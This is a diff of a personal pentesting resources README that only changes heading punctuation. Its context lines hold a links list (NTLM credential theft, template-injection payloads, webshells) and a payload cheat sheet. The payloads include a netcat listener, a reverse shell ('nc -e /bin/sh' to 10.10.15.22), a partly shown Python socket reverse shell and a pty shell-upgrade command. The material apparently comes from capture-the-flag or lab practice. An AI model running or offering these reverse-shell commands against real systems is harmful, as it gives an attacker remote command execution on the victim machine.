@@ -1,6 +1,6 @@
 # Resources
 A collection of links and payloads I stored for quick access
-# LINKS:
+# LINKS
 - [**NTLM Theft**](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds)
 - [**Server SideTemplate Injection Payloads**](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
 - [**Jenkins Pentesting**](https://book.hacktricks.xyz/cloud-security/jenkins#code-execution)
@@ -20,7 +20,7 @@ A collection of links and payloads I stored for quick access
 -  [**GTFO bins**](https://gtfobins.github.io/)
 -  [**Webshells**](https://github.com/BlackArch/webshells)
 
-# Payloads:
+# Payloads
 ## Local Webserver
 
 ### Python
@@ -46,7 +46,7 @@ nc -lnvp 4000
 ```
 
 ### [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-#### netcat
+#### netcat:
 ```bash
 nc -e /bin/sh 10.10.15.22 4000
 ```
@@ -61,7 +61,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 ### Interactive Shell
 
-#### Bash 
+#### Bash
 ```python
 python(3) -c 'import pty; pty.spawn("/bin/bash")'
 ```
